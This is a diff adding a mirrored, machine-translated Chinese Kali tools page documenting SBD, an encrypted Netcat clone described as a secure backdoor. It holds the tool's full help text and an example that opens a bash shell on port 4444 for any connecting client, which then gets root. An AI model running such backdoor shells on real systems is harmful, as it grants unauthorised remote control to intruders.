@@ -1,0 +1,65 @@
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>kali工具箱</title>
+<script src="./static/bootstrap.min.js"></script>
+<link rel="stylesheet" href="./static/main.css">
+<link rel="stylesheet" href="./static/bootstrap.min.css">
+<style type="text/css" id="syntaxhighlighteranchor"></style>
+</head>
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+<article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+<section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+<h2> SBD包装说明</h2><p style="text-align: justify;"> SBD是Netcat的克隆，设计为可移植并提供强大的加密。它运行在Unix类操作系统和微软的Win32。 SBD使用了AES-CBC-128 + HMAC-SHA1加密（由Christophe迪瓦恩），程序执行（-e选项），选择源端口，连续重联的延迟，和其他一些不错的功能。 SBD只支持TCP / IP通信。 </p><p> <a href="http://mirrors.kernel.org/gentoo/distfiles/sbd-1.37.tar.gz" variation="deepblue" target="blank">SBD首页</a> | <a href="http://git.kali.org/gitweb/?p=packages/sbd.git;a=summary" variation="deepblue" target="blank">卡利SBD回购</a> </p><ul><li>作者：米歇尔·Blomgren </li><li>许可：GPL第二版</li></ul><h2>包含在SBD封装工具</h2><h5> SBD - 安全后门为Linux和Windows </h5><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="54263b3b20143f35383d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# sbd -h<br>
+sbd 1.37 Copyright (C) 2004 Michel Blomgren &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6a070309020f0644080605070d180f042a1e030d0f181e0f0b0744190f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;<br>
+$Id: sbd.c,v 1.37 2005/08/21 22:40:47 shadow Exp $<br>
+<br>
+This program is free software; you can redistribute it and/or modify it under<br>
+the terms of the GNU General Public License as published by the Free Software<br>
+Foundation; either version 2 of the License, or (at your option) any later<br>
+version.<br>
+<br>
+connect (tcp): sbd [-options] host port<br>
+listen (tcp):  sbd -l -p port [-options]<br>
+options:<br>
+    -l          listen for incoming connection<br>
+    -p n        choose port to listen on, or source port to connect out from<br>
+    -a address  choose an address to listen on or connect out from<br>
+    -e prog     program to execute after connect (e.g. -e cmd.exe or -e bash)<br>
+    -r n        infinitely respawn/reconnect, pause for n seconds between<br>
+                connection attempts. -r0 can be used to re-listen after<br>
+                disconnect (just like a regular daemon)<br>
+    -c on|off   encryption on/off. specify whether you want to use the built-in<br>
+                AES-CBC-128 + HMAC-SHA1 encryption implementation (by<br>
+                Christophe Devine - http://www.cr0.net:8040/) or not<br>
+                default is: -c on<br>
+    -k secret   override default phrase to use for encryption (secret must be<br>
+                shared between client and server)<br>
+    -q          hush, quiet, don't print anything (overrides -v)<br>
+    -v          be verbose<br>
+    -n          toggle numeric-only IP addresses (don't do DNS resolution). if<br>
+                you specify -n twice, original state will be active (i.e. -n<br>
+                works like a on/off switch)<br>
+    -m          toggle monitoring (snooping) on/off (only used with the -e<br>
+                option). snooping can also be turned on by specifying -vv (-v<br>
+                two times)<br>
+    -P prefix   add prefix (+ a hardcoded separator) to all outbound data.<br>
+                this option is mostly only useful for sbd in "chat mode" (to<br>
+                prefix lines you send with your nickname)<br>
+    -H on|off   highlight incoming data with a hardcoded (color) escape<br>
+                sequence (for e.g. chatting). default is: -H off<br>
+    -V          print version banner and exit (include that output in your<br>
+                bug report and send bug report to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="55383c363d30397b37393a383227303b15213c323027213034387b2630">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>)<br>
+unix-like OS specific options:<br>
+    -s          invoke a shell, nothing else. if sbd is setuid 0, it'll invoke<br>
+                a root shell<br>
+    -w n        "immobility timeout" in seconds for idle read/write operations<br>
+                and program execution (the -e option)<br>
+    -D on|off   fork and run in background (daemonize). default: -D off</code><h3> SBD用法示例</h3><p>在服务器，侦听端口<b><i>4444（-p 4444）的连接</i></b> <b><i>（-l）</i></b>上<b><i>连接（-e bash）的</i></b>执行bash和没有名称解析<b><i>（-n）</i></b>显示详细输出<b><i>（-v）。</i></b> <br>在客户端，连接到远程服务器的IP地址<b><i>（192.168.1.202）</i></b>和端口<b><i>（4444）。</i></b> </p><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7a0815150e3a111b1613">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# sbd -l -p 4444 -e bash -v -n<br>
+listening on port 4444</code><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3b4954544f7b505a5752">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# sbd 192.168.1.202 4444<br>
+id<br>
+uid=0(root) gid=0(root) groups=0(root)</code><div style="display:none">
+<script src="//s11.cnzz.com/z_stat.php?id=1260038378&web_id=1260038378" language="JavaScript"></script>
+</div>
+</main></body></html>
